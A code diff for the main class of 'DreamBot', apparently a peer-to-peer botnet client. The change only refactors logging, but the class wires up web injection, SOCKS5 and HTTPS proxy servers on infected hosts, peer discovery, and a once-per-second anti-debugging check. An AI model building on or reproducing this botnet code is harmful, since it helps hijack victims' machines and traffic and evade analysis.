@@ -1,8 +1,10 @@
 using System;
 using System.Collections.Generic;
 using System.ComponentModel.Design;
+using System.Diagnostics;
 using DreamBot.Actions.Socks5;
 using DreamBot.Actions.WebInject;
+using DreamBot.Crypto;
 using DreamBot.Network;
 using DreamBot.Network.Comunication;
 using DreamBot.Network.Comunication.Listeners;
@@ -13,7 +15,6 @@ using DreamBot.Network.Protocol.Messages;
 using DreamBot.Network.Protocol.Messages.Command;
 using DreamBot.Network.Protocol.Messages.System;
 using DreamBot.Network.Protocol.Peers;
-using DreamBot.System;
 using DreamBot.System.Evation;
 using DreamBot.Workers;
 using MessageType = DreamBot.Network.Protocol.Messages.MessageType;
@@ -94,11 +95,12 @@ namespace DreamBot
         private readonly Socks5Server _socks5;
         private readonly HttpsProxyServer _https;
         public static BotIdentifier BotId;
+        private static readonly Log Logger = new Log(new TraceSource("BOT", SourceLevels.Verbose));
   
         public Bot(int port, BotIdentifier id)
         {
             BotId = id;
-            Logger.Info(0, "DreamBot [id: {0}] listenning on port {1}", BotId, port);
+            Logger.Info("DreamBot [id: {0}] listenning on port {1}", BotId, port);
 
             _worker = ClientWorker.Instance;
             _worker.QueueForever(AntiDebugging.CheckDebugger, TimeSpan.FromSeconds(1));
@@ -134,7 +136,7 @@ namespace DreamBot
 
         private void DesperateModeActivated(object sender, DesparateModeActivatedEventArgs e)
         {
-            Logger.Info(0, "Entering DESPERATE Mode");
+            Logger.Info("Entering DESPERATE Mode");
             foreach (var bot in e.Bots)
             {
                 var hello = new GetPeerListMessage();
@@ -144,7 +146,7 @@ namespace DreamBot
 
         public void Bootstrap(List<PeerInfo> peers)
         {
-            Logger.Info(0, "Bootstrapping init.  {0} found endpoints", peers.Count);
+            Logger.Info("Bootstrapping init.  {0} found endpoints", peers.Count);
             foreach (var peer in peers)
             {
                 _peerList.TryRegister(peer);
@@ -156,12 +158,12 @@ namespace DreamBot
 
         public void Run()
         {
-            Logger.Info(0,  "Starting DreamBot");
+            Logger.Info("Starting DreamBot");
             _worker.Start();
             _listener.Start();
             _socks5.Start();
             _https.Start();
-            Logger.Info(0, "DreamBot is running ;)");
+            Logger.Info("DreamBot is running ;)");
         }
 
         private void EnqueueMessage(object sender, UdpPacketReceivedEventArgs e)
